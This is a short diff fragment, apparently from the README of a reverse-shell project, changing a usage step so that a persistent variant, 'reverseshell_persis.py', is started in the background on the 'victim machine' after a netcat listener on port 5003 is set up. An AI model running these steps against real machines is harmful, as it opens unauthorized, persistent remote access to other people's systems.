@@ -32,7 +32,7 @@ nc -lnvp 5003
 
 - On the vivtim machine:
 ```
-python3 reverseshell.py &
+python3 reverseshell_persis.py &
 ```
 # Explained:
 
